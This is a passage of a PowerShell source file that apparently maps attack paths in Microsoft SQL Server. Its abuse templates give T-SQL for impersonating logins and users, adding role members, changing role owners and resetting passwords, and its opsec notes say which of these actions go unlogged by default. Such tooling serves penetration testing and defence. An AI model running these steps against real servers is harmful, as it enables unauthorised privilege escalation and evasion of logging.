                        "Connect to the $($context.principal.SQLServerName) SQL server as $($context.principal.Name) (e.g., using sqlcmd, SQL Server Management Studio, mssql-cli, or proxied Linux tooling such as impacket mssqlclient.py) and execute the following SQL statement:`n
                            `USE $($context.databaseName);` `n
                            Add member: `EXEC sp_addrolemember '$($context.targetPrincipal.Name)', 'user_name';` `n
                            Change owner: `ALTER AUTHORIZATION ON ROLE::[$($context.targetPrincipal.Name)] TO [user_name];` "
                    } elseif ($context.targetPrincipal.TypeDescription -eq "DATABASE") {
                        # Database itself - impersonate any user, add members to roles, change object owners
                        "Connect to the $($context.principal.SQLServerName) SQL server as $($context.principal.Name) (e.g., using sqlcmd, SQL Server Management Studio, mssql-cli, or proxied Linux tooling such as impacket mssqlclient.py) and execute the following SQL statement:`n
                            `USE $($context.targetPrincipal.Name);` `n
                            Impersonate user: `EXECUTE AS USER = 'user_name'; SELECT USER_NAME(); REVERT;` `n
                            Add member to role: `EXEC sp_addrolemember 'role_name', 'user_name';` `n
                            Change owner: `ALTER AUTHORIZATION ON ROLE::[role] TO [user_name];` "
                    }
                } else {
                    # Server-level targets
                    if ($context.targetPrincipal.TypeDescription -in @("WINDOWS_LOGIN", "WINDOWS_GROUP", "SQL_LOGIN", "ASYMMETRIC_KEY_MAPPED_LOGIN", "CERTIFICATE_MAPPED_LOGIN")) {
                        # Server login - impersonation
                        "Connect to the $($context.principal.SQLServerName) SQL server as $($context.principal.Name) (e.g., using sqlcmd, SQL Server Management Studio, mssql-cli, or proxied Linux tooling such as impacket mssqlclient.py) and execute the following SQL statement:`n
                            `EXECUTE AS LOGIN = '$($context.targetPrincipal.Name)'` `n
                            `   SELECT SUSER_NAME()` `n
                            `REVERT ` "
                    } elseif ($context.targetPrincipal.TypeDescription -eq "SERVER_ROLE") {
                        # Server role - add member and change owner
                        "Connect to the $($context.principal.SQLServerName) SQL server as $($context.principal.Name) (e.g., using sqlcmd, SQL Server Management Studio, mssql-cli, or proxied Linux tooling such as impacket mssqlclient.py) and execute the following SQL statement:`n
                            Add member: `EXEC sp_addsrvrolemember 'login_name', '$($context.targetPrincipal.Name)';` `n
                            Change owner: `ALTER AUTHORIZATION ON SERVER ROLE::[$($context.targetPrincipal.Name)] TO [login_name];` "
                    }
                }
            )
            linuxAbuse = $(
                if ($context.databaseName) {
                    # Database-level targets
                    if ($context.targetPrincipal.TypeDescription -in @("WINDOWS_USER", "WINDOWS_GROUP", "SQL_USER", "ASYMMETRIC_KEY_MAPPED_USER", "CERTIFICATE_MAPPED_USER")) {
                        # Database user - impersonation
                        "Connect to the $($context.principal.SQLServerName) SQL server as $($context.principal.Name) (e.g., using impacket mssqlclient.py or proxied Windows tooling such as sqlcmd, mssql-cli, or SQL Server Management Studio) and execute the following SQL statement:`n
                            `USE $($context.databaseName);` `n
                            `EXECUTE AS USER = '$($context.targetPrincipal.Name)'` `n
                            `   SELECT USER_NAME()` `n
                            `REVERT ` "
                    } elseif ($context.targetPrincipal.TypeDescription -eq "DATABASE_ROLE") {
                        # Database role - add member and change owner
                        "Connect to the $($context.principal.SQLServerName) SQL server as $($context.principal.Name) (e.g., using impacket mssqlclient.py or proxied Windows tooling such as sqlcmd, mssql-cli, or SQL Server Management Studio) and execute the following SQL statement:`n
                            `USE $($context.databaseName);` `n
                            Add member: `EXEC sp_addrolemember '$($context.targetPrincipal.Name)', 'user_name';` `n
                            Change owner: `ALTER AUTHORIZATION ON ROLE::[$($context.targetPrincipal.Name)] TO [user_name];` "
                    } elseif ($context.targetPrincipal.TypeDescription -eq "DATABASE") {
                        # Database itself - impersonate any user, add members to roles
                        "Connect to the $($context.principal.SQLServerName) SQL server as $($context.principal.Name) (e.g., using impacket mssqlclient.py or proxied Windows tooling such as sqlcmd, mssql-cli, or SQL Server Management Studio) and execute the following SQL statement:`n
                            `USE $($context.targetPrincipal.Name);` `n
                            Impersonate user: `EXECUTE AS USER = 'user_name'; SELECT USER_NAME(); REVERT;` `n
                            Add member to role: `EXEC sp_addrolemember 'role_name', 'user_name';` `n
                            Change owner: `ALTER AUTHORIZATION ON ROLE::[role] TO [user_name];` "
                    }
                } else {
                    # Server-level targets
                    if ($context.targetPrincipal.TypeDescription -in @("WINDOWS_LOGIN", "WINDOWS_GROUP", "SQL_LOGIN", "ASYMMETRIC_KEY_MAPPED_LOGIN", "CERTIFICATE_MAPPED_LOGIN")) {
                        # Server login - impersonation
                        "Connect to the $($context.principal.SQLServerName) SQL server as $($context.principal.Name) (e.g., using impacket mssqlclient.py or proxied Windows tooling such as sqlcmd, mssql-cli, or SQL Server Management Studio) and execute the following SQL statement:`n
                            `EXECUTE AS LOGIN = '$($context.targetPrincipal.Name)'` `n
                            `   SELECT SUSER_NAME()` `n
                            `REVERT ` "
                    } elseif ($context.targetPrincipal.TypeDescription -eq "SERVER_ROLE") {
                        # Server role - add member and change owner
                        "Connect to the $($context.principal.SQLServerName) SQL server as $($context.principal.Name) (e.g., using impacket mssqlclient.py or proxied Windows tooling such as sqlcmd, mssql-cli, or SQL Server Management Studio) and execute the following SQL statement:`n
                            Add member: `EXEC sp_addsrvrolemember 'login_name', '$($context.targetPrincipal.Name)';` `n
                            Change owner: `ALTER AUTHORIZATION ON SERVER ROLE::[$($context.targetPrincipal.Name)] TO [login_name];` "
                    }
                }
            )
            opsec = $(
                if ($context.databaseName) {
                    # Database-level
                    if ($context.targetPrincipal.TypeDescription -in @("WINDOWS_USER", "WINDOWS_GROUP", "SQL_USER", "ASYMMETRIC_KEY_MAPPED_USER", "CERTIFICATE_MAPPED_USER")) {
                        "SQL Server logs certain security-related events to a trace log by default, but must be configured to forward them to a SIEM. The local log may roll over frequently on large, active servers, as the default storage size is only 20 MB. Furthermore, the default trace log is deprecated and may be removed in future versions to be replaced permanently by Extended Events. `n
                        Log events are not generated for user impersonation by default."
                    } elseif ($context.targetPrincipal.TypeDescription -eq "DATABASE_ROLE") {
                        "SQL Server logs certain security-related events to a trace log by default, but must be configured to forward them to a SIEM. The local log may roll over frequently on large, active servers, as the default storage size is only 20 MB. Furthermore, the default trace log is deprecated and may be removed in future versions to be replaced permanently by Extended Events. `n
                        Log events are generated by default for additions to database role membership. Role ownership changes are not logged by default. `n
                        To view database role membership change logs, execute: `n
                            `SELECT StartTime, LoginName + CASE WHEN EventClass = 110 THEN ' added ' WHEN EventClass = 111 THEN ' removed ' END + TargetUserName + CASE WHEN EventClass = 110 THEN ' to ' WHEN EventClass = 111 THEN ' from ' END + ObjectName + ' in database ' + DatabaseName AS Change FROM sys.fn_trace_gettable((SELECT CONVERT(NVARCHAR(260), value) FROM sys.fn_trace_getinfo(1) WHERE property = 2), DEFAULT) WHERE EventClass IN (110, 111) ORDER BY StartTime DESC;` "
                    } elseif ($context.targetPrincipal.TypeDescription -eq "DATABASE") {
                        "SQL Server logs certain security-related events to a trace log by default, but must be configured to forward them to a SIEM. The local log may roll over frequently on large, active servers, as the default storage size is only 20 MB. Furthermore, the default trace log is deprecated and may be removed in future versions to be replaced permanently by Extended Events. `n
                        Log events are not generated for user impersonation or role ownership changes by default. Log events are generated by default for additions to database role membership.                         
                        To view database role membership change logs, execute: `n
                            `SELECT StartTime, LoginName + CASE WHEN EventClass = 110 THEN ' added ' WHEN EventClass = 111 THEN ' removed ' END + TargetUserName + CASE WHEN EventClass = 110 THEN ' to ' WHEN EventClass = 111 THEN ' from ' END + ObjectName + ' in database ' + DatabaseName AS Change FROM sys.fn_trace_gettable((SELECT CONVERT(NVARCHAR(260), value) FROM sys.fn_trace_getinfo(1) WHERE property = 2), DEFAULT) WHERE EventClass IN (110, 111) ORDER BY StartTime DESC;` "
                    }
                } else {
                    # Server-level
                    if ($context.targetPrincipal.TypeDescription -in @("WINDOWS_LOGIN", "WINDOWS_GROUP", "SQL_LOGIN", "ASYMMETRIC_KEY_MAPPED_LOGIN", "CERTIFICATE_MAPPED_LOGIN")) {
                        "SQL Server logs certain security-related events to a trace log by default, but must be configured to forward them to a SIEM. The local log may roll over frequently on large, active servers, as the default storage size is only 20 MB. Furthermore, the default trace log is deprecated and may be removed in future versions to be replaced permanently by Extended Events. `n
                        Log events are not generated for login impersonation by default."
                    } elseif ($context.targetPrincipal.TypeDescription -eq "SERVER_ROLE") {
                        "SQL Server logs certain security-related events to a trace log by default, but must be configured to forward them to a SIEM. The local log may roll over frequently on large, active servers, as the default storage size is only 20 MB. Furthermore, the default trace log is deprecated and may be removed in future versions to be replaced permanently by Extended Events. `n
                        Log events are generated by default for additions to server role membership. Server role ownership changes are not logged by default. `n
                        To view server role membership change logs, execute: `n
                            `SELECT StartTime, LoginName + ' added ' + TargetLoginName + ' to ' + RoleName AS Change FROM sys.fn_trace_gettable((SELECT CONVERT(NVARCHAR(260), value) FROM sys.fn_trace_getinfo(1) WHERE property = 2), DEFAULT) WHERE EventClass = 108 ORDER BY StartTime DESC;` "
                    }
                }
            )            
            references = "- https://learn.microsoft.com/en-us/sql/relational-databases/security/permissions-database-engine?view=sql-server-ver17#permissions-naming-conventions `n
                        - https://learn.microsoft.com/en-us/sql/t-sql/statements/execute-as-transact-sql?view=sql-server-ver17 `n
                        - https://learn.microsoft.com/en-us/sql/t-sql/statements/alter-authorization-transact-sql?view=sql-server-ver17 `n
                        - https://learn.microsoft.com/en-us/sql/database-engine/configure-windows/default-trace-enabled-server-configuration-option?view=sql-server-ver17"
        }
    }

    "MSSQL_ChangeOwner" = {
    # This one's weird because TAKE OWNERSHIP on the database itself does not allow the user to change the login that owns the database, but it allows the source principal to add members to any user-defined database role within that database. Note that only members of the db_owner fixed database role can add members to fixed database roles. This particular case is handled here for offensive case and via MSSQL_DBTakeOwnership for defensive case.

    #   Server level
    #       Source and target node types
    #           MSSQL_Login             -> MSSQL_ServerRole
    #           MSSQL_ServerRole        -> MSSQL_ServerRole
    #       Requirements
    #           SQL Server 2012 or higher (beginning of support for user-defined server roles)
    #           TAKE OWNERSHIP or CONTROL on a specific user-defined server role
    #       Default fixed roles with permission
    #           sysadmin (not drawing edge, included under ControlServer -> Contains[ServerRole])

    #   Database level
    #       Source and target node types
    #           MSSQL_DatabaseUser      -> MSSQL_DatabaseRole
    #           MSSQL_DatabaseRole      -> MSSQL_DatabaseRole
    #           MSSQL_ApplicationRole   -> MSSQL_DatabaseRole
    #       Requirements
    #           TAKE OWNERSHIP or CONTROL on a specific user-defined database role (fixed roles not affected unless principal is db_owner)
    #               OR
    #           TAKE OWNERSHIP or CONTROL on a specific database object, in which case this edge is drawn to all descendent user-defined database roles in that database's scope
    #       Default fixed roles with permission
    #           db_owner (not drawing edge, included under ControlDB -> Contains[DBRole])
    #           sysadmin (not drawing edge, included under ControlServer -> Contains[DB] -> Contains[DBRole])

        param($context)
        return @{
            traversable = $true                     
            general = "The source $($context.principalNodeType) can change the owner of this $($context.targetPrincipalNodeType) or descendent objects in its scope."
            windowsAbuse = "Connect to the $($context.principal.SQLServerName) SQL server as $($context.principal.Name) (e.g., using sqlcmd, SQL Server Management Studio, mssql-cli, or proxied Linux tooling such as impacket mssqlclient.py) and execute the following SQL statement:`n
                            $(if ($context.targetPrincipal.TypeDescription -eq 'SERVER_ROLE') {
                                "`ALTER AUTHORIZATION ON SERVER ROLE::[$($context.targetPrincipal.Name)] TO [login];` "
                            } elseif ($context.targetPrincipal.TypeDescription -eq 'DATABASE_ROLE') {
                                "`ALTER AUTHORIZATION ON ROLE::[$($context.targetPrincipal.Name)] TO [user];` "
                            })"
            linuxAbuse = "Connect to the $($context.principal.SQLServerName) SQL server as $($context.principal.Name) (e.g., using impacket mssqlclient.py or proxied Windows tooling such as sqlcmd, mssql-cli, or SQL Server Management Studio) and execute the following SQL statement:`n
                            $(if ($context.targetPrincipal.TypeDescription -eq 'SERVER_ROLE') {
                                "`ALTER AUTHORIZATION ON SERVER ROLE::[$($context.targetPrincipal.Name)] TO [login];` "
                            } elseif ($context.targetPrincipal.TypeDescription -eq 'DATABASE_ROLE') {
                                "`ALTER AUTHORIZATION ON ROLE::[$($context.targetPrincipal.Name)] TO [user];` "
                            })"
            opsec = "SQL Server logs certain security-related events to a trace log by default, but must be configured to forward them to a SIEM. The local log may roll over frequently on large, active servers, as the default storage size is only 20 MB. Furthermore, the default trace log is deprecated and may be removed in future versions to be replaced permanently by Extended Events. `n
                            Role ownership changes are not logged by default."
            references = "- https://learn.microsoft.com/en-us/sql/t-sql/statements/alter-server-role-transact-sql?view=sql-server-ver17#permissions `n
                            - https://learn.microsoft.com/en-us/sql/database-engine/configure-windows/default-trace-enabled-server-configuration-option?view=sql-server-ver17 `n
                            - https://learn.microsoft.com/en-us/sql/relational-databases/security/auditing/sql-server-audit-database-engine?view=sql-server-ver16"
            composition = 
                $(if ($context.targetPrincipal.TypeDescription -eq 'SERVER_ROLE') {
                    "MATCH 
                    (source {objectid: '$($context.principal.ObjectIdentifier.Replace('\','\\').ToUpper())'}), 
                    (server:MSSQL_Server {objectid: '$($context.principal.SQLServerID.Replace('\','\\').ToUpper())'}), 
                    (role:MSSQL_ServerRole {objectid: '$($context.targetPrincipal.ObjectIdentifier.Replace('\','\\').ToUpper())'})
                    MATCH p0 = (source)-[:MSSQL_ChangeOwner]->(role) 
                    MATCH p1 = (server)-[:MSSQL_Contains]->(source)
                    MATCH p2 = (server)-[:MSSQL_Contains]->(role)
                    MATCH p3 = (source)-[:MSSQL_TakeOwnership|MSSQL_Control]->(role) 
                    RETURN p0, p1, p2, p3"
                } elseif ($context.targetPrincipal.TypeDescription -eq 'DATABASE_ROLE') {
                    "MATCH 
                    (source {objectid: '$($context.principal.ObjectIdentifier.Replace('\','\\').ToUpper())'}), 
                    (server:MSSQL_Server {objectid: '$($context.principal.SQLServerID.Replace('\','\\').ToUpper())'}), 
                    (database:MSSQL_Database {objectid: '$($context.targetPrincipal.ObjectIdentifier.Split('@')[1].Replace('\','\\').ToUpper())'}),
                    (role:MSSQL_DatabaseRole {objectid: '$($context.targetPrincipal.ObjectIdentifier.Replace('\','\\').ToUpper())'})
                    MATCH p0 = (source)-[:MSSQL_ChangeOwner]->(role)
                    MATCH p1 = (server)-[:MSSQL_Contains]->(database)
                    MATCH p2 = (database)-[:MSSQL_Contains]->(source) 
                    MATCH p3 = (database)-[:MSSQL_Contains]->(role) 
                    OPTIONAL MATCH p4 = (source)-[:MSSQL_TakeOwnership|MSSQL_Control]->(database) 
                    OPTIONAL MATCH p5 = (source)-[:MSSQL_TakeOwnership|MSSQL_Control]->(role) 
                    RETURN p0, p1, p2, p3, p4, p5"
                })
        }
    }    

    "MSSQL_ChangePassword" = {
    # Server level
    #   Source and target node types
    #       MSSQL_Login             -> MSSQL_Login
    #       MSSQL_ServerRole        -> MSSQL_Login
    #   Requirements
    #       ALTER ANY LOGIN on the server
    #       Can't change another login's password without ALTER ANY LOGIN, even with ALTER or CONTROL explicitly assigned
    #       End node must be a SQL Login (not a Windows one) and cannot be the sa login
    #       If the login that is being changed is a member of the sysadmin fixed server role or a grantee of CONTROL SERVER permission, also requires CONTROL SERVER permission to reset the password without supplying the current password
    #   Default fixed roles with permission
    #       securityadmin (via ALTER ANY LOGIN)
    #       sysadmin (not drawing edge, included under ControlServer -> Contains[Login])

    # Database level
    #   Source and target node types
    #       MSSQL_DatabaseUser      -> MSSQL_ApplicationRole
    #       MSSQL_DatabaseRole      -> MSSQL_ApplicationRole
    #       MSSQL_ApplicationRole   -> MSSQL_ApplicationRole
    #   Requirements
    #       ALTER ANY APPLICATION ROLE (ALTER/CONTROL on a specific application role does not allow password change)
    #   Default fixed roles with permission
    #       db_owner (not drawing edge, included under ControlDB -> Contains[AppRole])
    #       db_securityadmin
    #       sysadmin (not drawing edge, included under ControlServer -> Contains[DB] -> Contains[AppRole])

        param($context)
        return @{
            traversable = $true
            general = $(if ($context.targetPrincipal.TypeDescription -eq 'APPLICATION_ROLE') {
                "WARNING: DO NOT execute this attack, as it will immediately break the application that relies on this application role to access this database and WILL cause an outage. The `ALTER ANY APPLICATION ROLE` permission on a database allows the source $($context.principalNodeType) to change the password for an application role, activate the application role with the new password, and execute actions with the application role's permissions."
            } else {
                "The source $($context.principalNodeType) can change the password for this $($context.targetPrincipalNodeType)."
            })
            windowsAbuse = $(if ($context.targetPrincipal.TypeDescription -eq 'APPLICATION_ROLE') {
                "WARNING: DO NOT execute this attack, as it will immediately break the application that relies on this application role to access this database and WILL cause an outage. The `ALTER ANY APPLICATION ROLE` permission on a database allows the source $($context.principalNodeType) to change the password for an application role, activate the application role with the new password, and execute actions with the application role's permissions."
            } else {
                "Connect to the $($context.principal.SQLServerName) SQL server (e.g., using sqlcmd, SQL Server Management Studio, mssql-cli, or proxied Linux tooling such as impacket mssqlclient.py) and execute the following SQL statement:`n
                    `ALTER LOGIN [$($context.targetPrincipal.Name)] WITH PASSWORD = 'password';` "            
            })
            linuxAbuse = $(if ($context.targetPrincipal.TypeDescription -eq 'APPLICATION_ROLE') {
                "WARNING: DO NOT execute this attack, as it will immediately break the application that relies on this application role to access this database and WILL cause an outage. The `ALTER ANY APPLICATION ROLE` permission on a database allows the source $($context.principalNodeType) to change the password for an application role, activate the application role with the new password, and execute actions with the application role's permissions."
            } else {
                "Connect to the $($context.principal.SQLServerName) SQL server (e.g., using impacket mssqlclient.py or proxied Windows tooling such as sqlcmd, mssql-cli, or SQL Server Management Studio) and execute the following SQL statement:`n
                    `ALTER LOGIN [$($context.targetPrincipal.Name)] WITH PASSWORD = 'password';` "            
            })
            opsec = $(if ($context.targetPrincipal.TypeDescription -eq 'APPLICATION_ROLE') {
                "WARNING: DO NOT execute this attack, as it will immediately break the application that relies on this application role to access this database and WILL cause an outage. The `ALTER ANY APPLICATION ROLE` permission on a database allows the source $($context.principalNodeType) to change the password for an application role, activate the application role with the new password, and execute actions with the application role's permissions."
            } else {
                "SQL Server logs certain security-related events to a trace log by default, but must be configured to forward them to a SIEM. The local log may roll over frequently on large, active servers, as the default storage size is only 20 MB. Furthermore, the default trace log is deprecated and may be removed in future versions to be replaced permanently by Extended Events. `n                                            
                    Log events are not generated for password changes by default."
            })
            references = $(if ($context.targetPrincipal.TypeDescription -eq 'APPLICATION_ROLE') {
                "- https://learn.microsoft.com/en-us/sql/relational-databases/security/authentication-access/application-roles?view=sql-server-ver17"
            } else {
                "- https://learn.microsoft.com/en-us/sql/t-sql/statements/alter-login-transact-sql?view=sql-server-ver17 `n
                 - https://learn.microsoft.com/en-us/sql/database-engine/configure-windows/default-trace-enabled-server-configuration-option?view=sql-server-ver17` "
            })
            composition = 
                $(if ($context.targetPrincipal.TypeDescription -eq 'APPLICATION_ROLE') {
                    "MATCH 
                    (source {objectid: '$($context.principal.ObjectIdentifier.Replace('\','\\').ToUpper())'}), 
                    (server:MSSQL_Server {objectid: '$($context.principal.SQLServerID.Replace('\','\\').ToUpper())'}), 
                    (database:MSSQL_Database {objectid: '$($context.targetPrincipal.ObjectIdentifier.Split('@')[1].Replace('\','\\').ToUpper())'}),
                    (role:MSSQL_ApplicationRole {objectid: '$($context.targetPrincipal.ObjectIdentifier.Replace('\','\\').ToUpper())'})
                    MATCH p0 = (source)-[:MSSQL_ChangePassword]->(role)
                    MATCH p1 = (server)-[:MSSQL_Contains]->(database)
                    MATCH p2 = (database)-[:MSSQL_Contains]->(source) 
                    MATCH p3 = (database)-[:MSSQL_Contains]->(role) 
                    MATCH p4 = (source)-[:MSSQL_AlterAnyAppRole]->(database) 
                    RETURN p0, p1, p2, p3, p4"
                } else { 
                    # Logins
                    "MATCH 
                    (source {objectid: '$($context.principal.ObjectIdentifier.Replace('\','\\').ToUpper())'}), 
                    (server:MSSQL_Server {objectid: '$($context.principal.SQLServerID.Replace('\','\\').ToUpper())'}), 
                    (login:MSSQL_Login {objectid: '$($context.targetPrincipal.ObjectIdentifier.Replace('\','\\').ToUpper())'})
                    MATCH p0 = (source)-[:MSSQL_ChangePassword]->(login)
                    MATCH p1 = (server)-[:MSSQL_Contains]->(source) 
                    MATCH p2 = (server)-[:MSSQL_Contains]->(login) 
                    MATCH p3 = (source)-[:MSSQL_AlterAnyLogin]->(server) 
                    RETURN p0, p1, p2, p3"
                })
        }
    }

    "MSSQL_ExecuteAs" = {
    # Server level
    #   Source and target node types
    #       MSSQL_Login             -> MSSQL_Login
    #       MSSQL_ServerRole        -> MSSQL_Login
    #   Requirements
    #       IMPERSONATE or CONTROL on a specific server login
    #   Default fixed roles with permission
    #       sysadmin (not drawing edge, included under ControlServer -> Contains[Login])

    # Database level
    #   Source and target node types
    #       MSSQL_DatabaseUser      -> MSSQL_DatabaseUser
    #       MSSQL_DatabaseRole      -> MSSQL_DatabaseUser
    #       MSSQL_ApplicationRole   -> MSSQL_DatabaseUser
    #   Requirements
    #       IMPERSONATE or CONTROL on a specific database user
    #   Default fixed roles with permission
    #       sysadmin (not drawing edge, included under ControlServer -> Contains[Database] -> Contains[DatabaseUser])
    #       db_owner (not drawing edge, included under ControlDB -> Contains[DatabaseUser])
    
        param($context)
        return @{
            traversable = $true
            general = "The `IMPERSONATE` or `CONTROL` permission on a server login or database user allows the source $($context.principalNodeType) to impersonate the target principal."
            windowsAbuse = $(
                if ($context.databaseName) {
                    # Database-level impersonation (EXECUTE AS USER)
                    "Connect to the $($context.principal.SQLServerName) SQL server as $($context.principal.Name) (e.g., using sqlcmd, SQL Server Management Studio, mssql-cli, or proxied Linux tooling such as impacket mssqlclient.py) and execute the following SQL statement:`n
                        `USE $($context.databaseName);` `n
                        `EXECUTE AS USER = '$($context.targetPrincipal.Name)'` `n
                        `   SELECT USER_NAME()` `n
                        `REVERT ` "
                } else {
                    # Server-level impersonation (EXECUTE AS LOGIN)
                    "Connect to the $($context.principal.SQLServerName) SQL server as $($context.principal.Name) (e.g., using sqlcmd, SQL Server Management Studio, mssql-cli, or proxied Linux tooling such as impacket mssqlclient.py) and execute the following SQL statement:`n
                        `EXECUTE AS LOGIN = '$($context.targetPrincipal.Name)'` `n
                        `   SELECT SUSER_NAME()` `n
                        `REVERT ` "
                }
            )
            linuxAbuse = $(
                if ($context.databaseName) {
                    # Database-level impersonation
                    "Connect to the $($context.principal.SQLServerName) SQL server as $($context.principal.Name) (e.g., using impacket mssqlclient.py or proxied Windows tooling such as sqlcmd, mssql-cli, or SQL Server Management Studio) and execute the following SQL statement:`n
                        `USE $($context.databaseName);` `n
                        `EXECUTE AS USER = '$($context.targetPrincipal.Name)'` `n
                        `   SELECT USER_NAME()` `n
                        `REVERT ` "
                } else {
                    # Server-level impersonation
                    "Connect to the $($context.principal.SQLServerName) SQL server as $($context.principal.Name) (e.g., using impacket mssqlclient.py or proxied Windows tooling such as sqlcmd, mssql-cli, or SQL Server Management Studio) and execute the following SQL statement:`n
                        `EXECUTE AS LOGIN = '$($context.targetPrincipal.Name)'` `n
                        `   SELECT SUSER_NAME()` `n
                        `REVERT ` "
                }
            )
            opsec = "SQL Server logs certain security-related events to a trace log by default, but must be configured to forward them to a SIEM. The local log may roll over frequently on large, active servers, as the default storage size is only 20 MB. Furthermore, the default trace log is deprecated and may be removed in future versions to be replaced permanently by Extended Events. `n                                            
                    Log events are not generated for $(if ($context.databaseName) { 'user' } else { 'login' }) impersonation by default."
            references = "- https://learn.microsoft.com/en-us/sql/t-sql/statements/execute-as-transact-sql?view=sql-server-ver17 `n
                          - https://learn.microsoft.com/en-us/sql/database-engine/configure-windows/default-trace-enabled-server-configuration-option?view=sql-server-ver17` "
            composition = 
                $(if ($context.databaseName) {
                    # Database users
                    "MATCH 
                    (source {objectid: '$($context.principal.ObjectIdentifier.Replace('\','\\').ToUpper())'}), 
                    (server:MSSQL_Server {objectid: '$($context.principal.SQLServerID.Replace('\','\\').ToUpper())'}), 
                    (database:MSSQL_Database {objectid: '$($context.targetPrincipal.ObjectIdentifier.Split('@')[1].Replace('\','\\').ToUpper())'}),
                    (target:MSSQL_DatabaseUser {objectid: '$($context.targetPrincipal.ObjectIdentifier.Replace('\','\\').ToUpper())'})
                    MATCH p0 = (source)-[:MSSQL_ExecuteAs]->(target)
                    MATCH p1 = (server)-[:MSSQL_Contains]->(database)
                    MATCH p2 = (database)-[:MSSQL_Contains]->(source) 
                    MATCH p3 = (database)-[:MSSQL_Contains]->(target) 
                    MATCH p4 = (source)-[:MSSQL_Impersonate|MSSQL_Control]->(target) 
                    RETURN p0, p1, p2, p3, p4"
                } else { 
                    # Logins
                    "MATCH 
                    (source {objectid: '$($context.principal.ObjectIdentifier.Replace('\','\\').ToUpper())'}), 
                    (server:MSSQL_Server {objectid: '$($context.principal.SQLServerID.Replace('\','\\').ToUpper())'}), 
                    (target:MSSQL_Login {objectid: '$($context.targetPrincipal.ObjectIdentifier.Replace('\','\\').ToUpper())'})
                    MATCH p0 = (source)-[:MSSQL_ExecuteAs]->(target)
                    MATCH p1 = (server)-[:MSSQL_Contains]->(source) 
                    MATCH p2 = (server)-[:MSSQL_Contains]->(target) 
                    MATCH p3 = (source)-[:MSSQL_Impersonate|MSSQL_Control]->(target) 
                    RETURN p0, p1, p2, p3"
                })        
        }
    }        

    "MSSQL_Impersonate" = {
    # Server level
    #   Source and target node types
    #       MSSQL_Login             -> MSSQL_Login
    #       MSSQL_ServerRole        -> MSSQL_Login
    #   Requirements
    #       IMPERSONATE on a specific server login
    #   Default fixed roles with permission
    #       sysadmin (not drawing edge, included under ControlServer -> Contains[Login])

    # Database level
    #   Source and target node types
    #       MSSQL_DatabaseUser      -> MSSQL_DatabaseUser
    #       MSSQL_DatabaseRole      -> MSSQL_DatabaseUser
    #       MSSQL_ApplicationRole   -> MSSQL_DatabaseUser
    #   Requirements
    #       IMPERSONATE on a specific database user
    #   Default fixed roles with permission
    #       sysadmin (not drawing edge, included under ControlServer -> Contains[Database] -> Contains[DatabaseUser])
    #       db_owner (not drawing edge, included under ControlDB -> Contains[DatabaseUser])
    
        param($context)
        return @{
            traversable = $false
            general = "The `IMPERSONATE` permission on a securable object effectively grants the source $($context.principalNodeType) the ability to impersonate the target object."
            windowsAbuse = $(
                if ($context.databaseName) {
                    # Database-level impersonation (EXECUTE AS USER)
                    "Connect to the $($context.principal.SQLServerName) SQL server as $($context.principal.Name) (e.g., using sqlcmd, SQL Server Management Studio, mssql-cli, or proxied Linux tooling such as impacket mssqlclient.py) and execute the following SQL statement:`n
                        `USE $($context.databaseName);` `n
                        `EXECUTE AS USER = '$($context.targetPrincipal.Name)'` `n
                        `   SELECT USER_NAME()` `n
                        `REVERT ` "
                } else {
                    # Server-level impersonation (EXECUTE AS LOGIN)
                    "Connect to the $($context.principal.SQLServerName) SQL server as $($context.principal.Name) (e.g., using sqlcmd, SQL Server Management Studio, mssql-cli, or proxied Linux tooling such as impacket mssqlclient.py) and execute the following SQL statement:`n
                        `EXECUTE AS LOGIN = '$($context.targetPrincipal.Name)'` `n
                        `   SELECT SUSER_NAME()` `n
                        `REVERT ` "
                }
            )
            linuxAbuse = $(
                if ($context.databaseName) {
                    # Database-level impersonation
                    "Connect to the $($context.principal.SQLServerName) SQL server as $($context.principal.Name) (e.g., using impacket mssqlclient.py or proxied Windows tooling such as sqlcmd, mssql-cli, or SQL Server Management Studio) and execute the following SQL statement:`n
                        `USE $($context.databaseName);` `n
                        `EXECUTE AS USER = '$($context.targetPrincipal.Name)'` `n
                        `   SELECT USER_NAME()` `n
                        `REVERT ` "
                } else {
                    # Server-level impersonation
                    "Connect to the $($context.principal.SQLServerName) SQL server as $($context.principal.Name) (e.g., using impacket mssqlclient.py or proxied Windows tooling such as sqlcmd, mssql-cli, or SQL Server Management Studio) and execute the following SQL statement:`n
                        `EXECUTE AS LOGIN = '$($context.targetPrincipal.Name)'` `n
                        `   SELECT SUSER_NAME()` `n
                        `REVERT ` "
                }
            )
            opsec = "SQL Server logs certain security-related events to a trace log by default, but must be configured to forward them to a SIEM. The local log may roll over frequently on large, active servers, as the default storage size is only 20 MB. Furthermore, the default trace log is deprecated and may be removed in future versions to be replaced permanently by Extended Events. `n                                            
                    Log events are not generated for $(if ($context.databaseName) { 'user' } else { 'login' }) impersonation by default."
            references = "- https://learn.microsoft.com/en-us/sql/relational-databases/security/permissions-database-engine?view=sql-server-ver17#permissions-naming-conventions `n
                          - https://learn.microsoft.com/en-us/sql/t-sql/statements/execute-as-transact-sql?view=sql-server-ver17 `n
                          - https://learn.microsoft.com/en-us/sql/database-engine/configure-windows/default-trace-enabled-server-configuration-option?view=sql-server-ver17` "
        }
    }

    ############################
    ##  defensive edge kinds  ##
    ############################

    "MSSQL_AlterDB" = {
    # Another weird one because this permission is set on the database itself and applies to child objects in the scope of the database
    # This grants the ALTER ANY ROLE and ALTER ANY APPLICATION ROLE effective permissions to database principals
    # It does NOT grant the ability to alter the owner of the database or set the TRUSTWORTHY property

    # Database level
    #   Source and target node types
    #       MSSQL_DatabaseUser      -> MSSQL_DatabaseRole
    #       MSSQL_DatabaseUser      -> MSSQL_ApplicationRole
    #       MSSQL_DatabaseRole      -> MSSQL_DatabaseRole
    #       MSSQL_DatabaseRole      -> MSSQL_ApplicationRole
    #       MSSQL_ApplicationRole   -> MSSQL_DatabaseRole
    #       MSSQL_ApplicationRole   -> MSSQL_ApplicationRole
    #   Requirements
    #       ALTER on the database object
    #       Can only alter user-defined roles unless principal is db_owner
    #   Default fixed roles with permission
    #       sysadmin (not drawing edge, included under ControlServer -> Contains[Database] -> Contains[object])
    #       db_owner (not drawing edge, included under ControlDB -> Contains[object])

        param($context)
        return @{
            traversable = $true
